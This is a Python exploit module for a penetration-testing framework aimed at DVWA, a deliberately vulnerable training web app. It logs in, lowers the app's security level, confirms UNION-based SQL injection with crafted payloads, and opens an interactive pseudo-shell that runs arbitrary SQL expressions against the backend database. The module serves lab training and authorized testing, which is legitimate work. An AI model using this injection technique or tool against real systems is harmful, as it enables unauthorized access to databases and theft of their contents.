#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DVWA SQL Injection lab helper (authorized testing only).

Authenticates like other DVWA KittySploit modules, forces security level low when possible,
confirms UNION-based injection on vulnerabilities/sqli, then uses :class:`~lib.protocols.http.sqli.Sqli`
``shell_sqli`` (pseudo-shell) or ``single_sql`` (one shot).
"""

from kittysploit import *
from bs4 import BeautifulSoup
import re
import urllib.parse
from typing import Any, Optional, Tuple

from lib.protocols.http.http_client import Http_client
from lib.protocols.http.http_login import Http_login
from lib.protocols.http.sqli import Sqli


class Module(Auxiliary, Http_client, Http_login, Sqli):

    __info__ = {
        "name": "DVWA SQLi shell (lab)",
        "description": (
            "Login to DVWA (CSRF token), set security low, UNION SQLi on /vulnerabilities/sqli/; "
            "uses lib Sqli pseudo-shell (shell_sqli) or single_sql."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "dvwa", "sqli", "mysql", "training"],
        "references": [
            "https://github.com/digininja/DVWA",
            "https://owasp.org/www-community/attacks/SQL_Injection",
        ],
    }

    base_path = OptString("/", "DVWA base path (e.g. / or /dvwa)", required=False)
    sqli_path = OptString(
        "/vulnerabilities/sqli/",
        "Path to DVWA SQLi page (relative to base_path)",
        required=False,
    )
    force_security_low = OptBool(True, "POST security.php to set difficulty low", required=False)
    shell_sqli = OptBool(
        True,
        "After UNION confirmation, start Sqli pseudo-shell (set false for single_sql only)",
        required=False,
    )

    # DVWA prints rows as "First name: … Surname: …" inside <pre>; the page also
    # contains static examples — never use .search() (first match), pick the
    # injection row (first column == marker) or the last block.
    _FIRST_SURNAME_RE = re.compile(
        r"First\s*name:\s*([^<\n\r]+).*?Surname:\s*([^<\n\r]+)",
        re.IGNORECASE | re.DOTALL,
    )

    def _join_path(self, path: str) -> str:
        base = str(self.base_path or "/").strip() or "/"
        if not base.startswith("/"):
            base = f"/{base}"
        if base != "/" and base.endswith("/"):
            base = base[:-1]
        suffix = path if str(path).startswith("/") else f"/{path}"
        if base == "/":
            return suffix
        return f"{base}{suffix}"

    def get_user_token(self, source: str) -> str:
        if not source:
            return ""
        soup = BeautifulSoup(source, "html.parser")
        field = soup.find("input", {"name": "user_token"})
        if field:
            return field.get("value") or ""
        field = soup.find("input", {"type": "hidden"})
        if field:
            return field.get("value") or ""
        return ""

    def _login(self):
        login_path = self._join_path("/login.php")
        login = self.http_request(method="GET", path=login_path, session=True)
        if not login or not getattr(login, "text", ""):
            return None
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Upgrade-Insecure-Requests": "1",
        }
        data = {
            "username": self.username,
            "password": self.password,
            "Login": "Submit",
            "user_token": self.get_user_token(login.text),
        }
        r = self.http_request(
            method="POST",
            path=login_path,
            data=data,
            headers=headers,
            session=True,
        )
        if not r or "Login failed" in (r.text or ""):
            self.login_failed()
            return None
        self.login_success()
        return r

    def _set_security_low(self) -> bool:
        security_path = self._join_path("/security.php")
        page = self.http_request(method="GET", path=security_path, session=True)
        if not page or not getattr(page, "text", ""):
            return False
        token = self.get_user_token(page.text)
        data = {"security": "low", "seclev_submit": "Submit"}
        if token:
            data["user_token"] = token
        resp = self.http_request(method="POST", path=security_path, data=data, session=True)
        return bool(resp)

    def _sqli_page_path(self) -> str:
        return self._join_path(str(self.sqli_path or "/vulnerabilities/sqli/"))

    def _sqli_get(self, id_value: str, user_token: str = "") -> Optional[Any]:
        params = {"id": id_value, "Submit": "Submit"}
        if user_token:
            params["user_token"] = user_token
        query = urllib.parse.urlencode(params)
        path = f"{self._sqli_page_path()}?{query}"
        return self.http_request(method="GET", path=path, session=True)

    def _normalize_pre_block(self, html: str) -> str:
        return html.replace("<br />", "\n").replace("<br/>", "\n").replace("<br>", "\n")

    def _all_first_surname_pairs(self, html: str):
        text = self._normalize_pre_block(html or "")
        return list(self._FIRST_SURNAME_RE.finditer(text))

    def _parse_first_surname(
        self,
        html: str,
        *,
        prefer_first: Optional[str] = None,
    ) -> Tuple[str, str]:
        """
        Extract (first_name, surname) from DVWA output.

        ``prefer_first``: when set (e.g. ``kittyshell`` or probe marker), use the
        last matching row so we skip static "admin / admin" help examples.
        """
        matches = self._all_first_surname_pairs(html)
        if not matches:
            return "", ""

        if prefer_first:
            needle = prefer_first.strip().lower()
            chosen = None
            for m in matches:
                if m.group(1).strip().lower() == needle:
                    chosen = m
            if chosen:
                return chosen.group(1).strip(), chosen.group(2).strip()

        m = matches[-1]
        return m.group(1).strip(), m.group(2).strip()

    def check(self):
        try:
            r = self.http_request(method="GET", path="/", session=False)
            return bool(r and getattr(r, "status_code", 0))
        except Exception:
            return False

    def sqli_fetch_scalar(self, user_line: str) -> Optional[str]:
        """Called by :class:`~lib.protocols.http.sqli.Sqli` handler / shell."""
        wrapped = Sqli.wrap_scalar_expression(user_line)
        if not wrapped:
            return None
        token = getattr(self, "_dvwa_sqli_token", "") or ""
        payload = f"1' UNION SELECT 'kittyshell',{wrapped}#"
        resp = self._sqli_get(payload, token)
        body = (resp.text or "") if resp else ""
        _, second_v = self._parse_first_surname(body, prefer_first="kittyshell")
        return second_v or None

    def run(self):
        self.vulnerability_info = {"reason": "", "severity": "Info"}

        if not self._login():
            self.vulnerability_info.update({
                "reason": "DVWA login failed",
                "severity": "Info",
            })
            return False

        if self.force_security_low:
            if not self._set_security_low():
                print_warning("Could not confirm security level set to low; continuing anyway.")

        landing = self.http_request(method="GET", path=self._sqli_page_path(), session=True)
        if not landing or not getattr(landing, "text", ""):
            print_error("Cannot load DVWA SQLi page.")
            self.vulnerability_info["reason"] = "SQLi page unreachable"
            return False

        token = self.get_user_token(landing.text)
        self._dvwa_sqli_token = token
        self._sqli_get("1", token)
        union_marker_a, union_marker_b = "KS_DVWA_A", "KS_DVWA_B"
        probe = self._sqli_get(
            f"1' UNION SELECT '{union_marker_a}','{union_marker_b}'#",
            token,
        )
        probe_text = (probe.text or "") if probe else ""
        f1, s1 = self._parse_first_surname(probe_text, prefer_first=union_marker_a)

        if union_marker_a not in probe_text and union_marker_a not in (f1 + s1):
            print_error("UNION-based SQLi not confirmed (markers missing).")
            self.vulnerability_info.update({
                "reason": "DVWA SQLi UNION probe failed",
                "severity": "Medium",
            })
            self.not_vulnerable()
            return False

        print_success("DVWA SQLi (UNION) confirmed.")

        self.vulnerability_info.update({
            "reason": "DVWA SQL injection (UNION); authenticated lab session",
            "severity": "High",
            "details": {
                "sqli_path": self._sqli_page_path(),
                "technique": "union_select",
            },
        })

        if self.shell_sqli:
            proof = self.sqli_fetch_scalar("@@version") or ""
            if proof:
                print_info(f"MySQL @@version: {proof[:500]}")
            self.vulnerability_info["version"] = proof[:200]
            self._start_sqli_shell()
        else:
            expr = self._opt_val(self.single_sql).strip() or "@@version"
            proof = self.sqli_fetch_scalar(expr) or ""
            if proof:
                print_info(proof)
            self.vulnerability_info["version"] = proof[:200]

        self.vulnerable()
        return True
